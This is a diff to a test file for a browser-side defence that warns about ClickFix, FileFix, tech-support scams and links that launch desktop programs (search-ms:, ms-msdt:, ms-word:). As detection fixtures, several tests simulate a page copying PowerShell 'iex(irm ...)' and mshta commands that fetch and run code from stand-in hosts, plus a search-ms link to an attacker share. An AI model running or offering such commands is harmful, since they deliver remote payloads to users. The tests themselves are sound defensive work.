@@ -386,6 +386,55 @@ describe('a link that opens a program outside the browser (B-165)', () => {
     expect(mounts).toHaveLength(1)
   })
 
+  it('lets every link through on a site in Trusted sites, and journals nothing', async () => {
+    // Round 2: an intranet serving Office documents over http met a blocking warning on
+    // every "open in the desktop app" link, even after the person trusted the site.
+    const { mounts, mountWarning } = mounted()
+    const deps = watch({ mountWarning, trusted: async () => true })
+    await Promise.resolve()
+    await Promise.resolve()
+
+    expect(click(link('ms-word:ofe|u|http://intranet.test/a.docx')).defaultPrevented).toBe(false)
+    expect(click(link('search-ms:query=x')).defaultPrevented).toBe(false)
+    expect(mounts).toHaveLength(0)
+    expect(deps.warned).not.toHaveBeenCalled()
+  })
+
+  it('holds the click while Trusted sites has not answered, and reads it again after', async () => {
+    const { mounts, mountWarning } = mounted()
+    let answer = false
+    watch({ mountWarning, trusted: async () => answer })
+    // Before the first answer the site counts as not trusted: a click is held.
+    expect(click(link('search-ms:query=1')).defaultPrevented).toBe(true)
+    await new Promise((resolve) => setTimeout(resolve, 0))
+
+    // The person trusts the site (from a lookalike panel, say); the next stopped click
+    // asks again, and the click after it goes through.
+    answer = true
+    mounts[0]?.handlers.onDismiss()
+    expect(click(link('search-ms:query=2')).defaultPrevented).toBe(true)
+    await new Promise((resolve) => setTimeout(resolve, 0))
+    expect(click(link('search-ms:query=3')).defaultPrevented).toBe(false)
+  })
+
+  it('a site whose Trusted sites answer fails is not trusted', async () => {
+    const { mountWarning } = mounted()
+    watch({ mountWarning, trusted: async () => Promise.reject(new Error('no answer')) })
+    await new Promise((resolve) => setTimeout(resolve, 0))
+    expect(click(link('search-ms:query=x')).defaultPrevented).toBe(true)
+  })
+
+  it('journals at most five different links on one page, and still stops every click', () => {
+    // A page clicking search-ms:query=1, =2, … wrote one "What changed" row per address.
+    const { mountWarning } = mounted()
+    const deps = watch({ mountWarning })
+    const prevented: boolean[] = []
+    for (let i = 0; i < 12; i += 1) prevented.push(click(link(`search-ms:query=${i}`)).defaultPrevented)
+
+    expect(prevented.every(Boolean)).toBe(true)
+    expect(deps.warned).toHaveBeenCalledTimes(5)
+  })
+
   it('stops listening when the watcher stops', () => {
     const { mounts, mountWarning } = mounted()
     watch({ mountWarning })
@@ -494,15 +543,13 @@ describe('the trap warnings through the real surface slot (B-165, round 1)', () 
     document.body.textContent = CLICKFIX_TEXT
     const slot = slotted()
     const deps = watch({ mountWarning: trapMount(slot) })
-    await settle()
     const anchor = link('search-ms:query=invoice&crumb=location:%5C%5Cfiles.attacker.test%5Cshare')
     anchor.addEventListener('click', () => {
       document.dispatchEvent(copyOf('powershell -w hidden -c "iex(irm http://x.test/a)"'))
     })
-    // The page text names the pretext from the start, so the medium warning may be up
-    // already; close it the way a person would and click the link.
-    if (slot.current() !== null) press(slot, 'dispute')
-    deps.warned.mockClear()
+    // Clicked before the watcher's first look at the page. A person who had already
+    // disputed the ClickFix warning on this page would not see it again (SCN-008); that
+    // is a separate test below, and this one is the FileFix click itself.
     anchor.click()
     await settle()
 
@@ -521,9 +568,6 @@ describe('the trap warnings through the real surface slot (B-165, round 1)', () 
     document.body.textContent = CLICKFIX_TEXT
     const slot = slotted()
     const deps = watch({ mountWarning: trapMount(slot) })
-    await settle()
-    if (slot.current() !== null) press(slot, 'dispute')
-    deps.warned.mockClear()
 
     const anchor = link('search-ms:query=x')
     anchor.addEventListener('click', () => {
@@ -541,18 +585,18 @@ describe('the trap warnings through the real surface slot (B-165, round 1)', () 
   })
 
   it('still ignores a trusted copy outside a held link click (the person\'s own)', async () => {
+    // Read on the warning it would raise: the person's own copy leaves the medium
+    // sentence ("wants you to"), never the claim that the page copied something.
     document.body.textContent = CLICKFIX_TEXT
     const slot = slotted()
     const deps = watch({ mountWarning: trapMount(slot) })
-    await settle()
-    if (slot.current() !== null) press(slot, 'dispute')
-    deps.warned.mockClear()
 
     const trusted = new Event('copy', { bubbles: true })
     Object.defineProperty(trusted, 'isTrusted', { value: true })
     document.dispatchEvent(trusted)
     await settle()
-    expect(deps.warned).not.toHaveBeenCalled()
+    expect(shown(slot)).toBe('[warnClickfixWants]')
+    expect(deps.warned).not.toHaveBeenCalledWith('clickfix', expect.arrayContaining(['copy-not-made-by-you']))
   })
 
   it('a ClickFix copy replaces a standing outside-link warning on an ordinary-looking page', async () => {
@@ -601,6 +645,135 @@ describe('the trap warnings through the real surface slot (B-165, round 1)', () 
     document.dispatchEvent(copyOf('powershell iex x'))
     await settle()
     expect(deps.warned).toHaveBeenCalledWith('clickfix', expect.any(Array))
+    expect(shown(slot)).toBe('[warnClickfixCopied]')
+  })
+
+  it('"This is wrong" on ClickFix is remembered for the page: a second copy raises nothing (SCN-008)', async () => {
+    // Round 2: the next scripted copy raised the warning again and wrote a second
+    // journal line, while SCN-008 said the warning closes for this page.
+    document.body.textContent = CLICKFIX_TEXT
+    const slot = slotted()
+    const deps = watch({ mountWarning: trapMount(slot) })
+    document.dispatchEvent(copyOf('powershell -w hidden -c "iex(irm http://x.test/a)"'))
+    await settle()
+    expect(shown(slot)).toBe('[warnClickfixCopied]')
+
+    press(slot, 'dispute')
+    document.dispatchEvent(copyOf('mshta https://x.test/verify.hta'))
+    await settle()
+
+    expect(panels()).toBe(0)
+    expect(deps.warned.mock.calls.filter(([kind]) => kind === 'clickfix')).toHaveLength(1)
+  })
+
+  it('"This is wrong" on tech-support is remembered for the page: a second forced fullscreen raises nothing (SCN-009)', async () => {
+    document.body.textContent = SCARE_TEXT
+    const slot = slotted()
+    const deps = watch({ mountWarning: trapMount(slot) })
+    await settle()
+    expect(shown(slot)).toBe('[warnTechsupportHeadline]')
+
+    press(slot, 'dispute')
+    Object.defineProperty(document, 'fullscreenElement', { configurable: true, value: document.body })
+    document.dispatchEvent(new Event('fullscreenchange', { bubbles: true }))
+    await settle()
+    Object.defineProperty(document, 'fullscreenElement', { configurable: true, value: null })
+
+    expect(panels()).toBe(0)
+    expect(deps.warned.mock.calls.filter(([kind]) => kind === 'techsupport')).toHaveLength(1)
+  })
+
+  it('a disputed ClickFix leaves the link warning standing on the FileFix click', async () => {
+    document.body.textContent = CLICKFIX_TEXT
+    const slot = slotted()
+    const deps = watch({ mountWarning: trapMount(slot) })
+    await settle()
+    expect(shown(slot)).toBe('[warnClickfixWants]')
+    press(slot, 'dispute')
+
+    const anchor = link('search-ms:query=x')
+    anchor.addEventListener('click', () => {
+      document.dispatchEvent(copyOf('powershell -w hidden -c "iex(irm http://x.test/a)"'))
+    })
+    anchor.click()
+    await settle()
+
+    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')
+    expect(deps.warned.mock.calls.filter(([kind]) => kind === 'clickfix')).toHaveLength(1)
+  })
+
+  it('ClickFix taking the panel from the link warning keeps what stood behind it (seam, round 2)', async () => {
+    // A lookalike the link warning pushed aside vanished when ClickFix took over: the
+    // link panel's close emptied the list, and lookalike runs once per page.
+    const slot = slotted()
+    slot.claim({
+      kind: 'lookalike',
+      severity: 'major',
+      props: { variant: 'lookalike', severity: 'major', headline: 'lookalike', detail: '', sourceLine: '' },
+      handlers: { onPrimary: () => {}, onRetry: () => {}, onDispute: () => {}, onDismiss: () => {} },
+    })
+    watch({ mountWarning: trapMount(slot) })
+    link('search-ms:query=x').click()
+    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')
+    expect(slot.waiting()).toEqual(['lookalike'])
+
+    document.body.append(document.createTextNode(` ${CLICKFIX_TEXT}`))
+    document.dispatchEvent(copyOf('powershell iex x'))
+    await settle()
+
+    expect(shown(slot)).toBe('[warnClickfixCopied]')
+    expect(slot.waiting()).toEqual(['lookalike'])
+    expect(slot.current()?.root.querySelector('[data-role=also]')?.textContent).toContain('lookalike')
+  })
+
+  it('an injection refused while the link warning is up is still listed after ClickFix takes over (unit, round 2)', async () => {
+    const slot = slotted()
+    watch({ mountWarning: trapMount(slot) })
+    link('ms-msdt:/id x').click()
+    slot.claim({
+      kind: 'injection',
+      severity: 'major',
+      props: { variant: 'injection', severity: 'major', headline: 'injection', detail: '', sourceLine: '' },
+      handlers: { onPrimary: () => {}, onRetry: () => {}, onDispute: () => {}, onDismiss: () => {} },
+    })
+    expect(slot.waiting()).toEqual(['injection'])
+
+    document.body.append(document.createTextNode(` ${CLICKFIX_TEXT}`))
+    document.dispatchEvent(copyOf('powershell iex x'))
+    await settle()
+
+    expect(shown(slot)).toBe('[warnClickfixCopied]')
+    expect(slot.waiting()).toEqual(['injection'])
+  })
+
+  it('a panel released from outside is not held on to: the next outside link is drawn (seam, round 2)', () => {
+    // The inspector's "This is wrong" calls slot.release() with no kind. The watcher
+    // kept its handle and stopped every later outside link with no panel.
+    const slot = slotted()
+    watch({ mountWarning: trapMount(slot) })
+    link('search-ms:query=x').click()
+    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')
+
+    slot.release()
+    expect(slot.current()).toBeNull()
+
+    const second = new MouseEvent('click', { bubbles: true, cancelable: true, button: 0 })
+    link('ms-msdt:/id x').dispatchEvent(second)
+    expect(second.defaultPrevented).toBe(true)
+    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')
+  })
+
+  it('a ClickFix panel released from outside does not leave ClickFix silent', async () => {
+    document.body.textContent = CLICKFIX_TEXT
+    const slot = slotted()
+    watch({ mountWarning: trapMount(slot) })
+    document.dispatchEvent(copyOf('powershell iex x'))
+    await settle()
+    expect(shown(slot)).toBe('[warnClickfixCopied]')
+
+    slot.release()
+    document.dispatchEvent(copyOf('mshta https://x.test/verify.hta'))
+    await settle()
     expect(shown(slot)).toBe('[warnClickfixCopied]')
   })
 
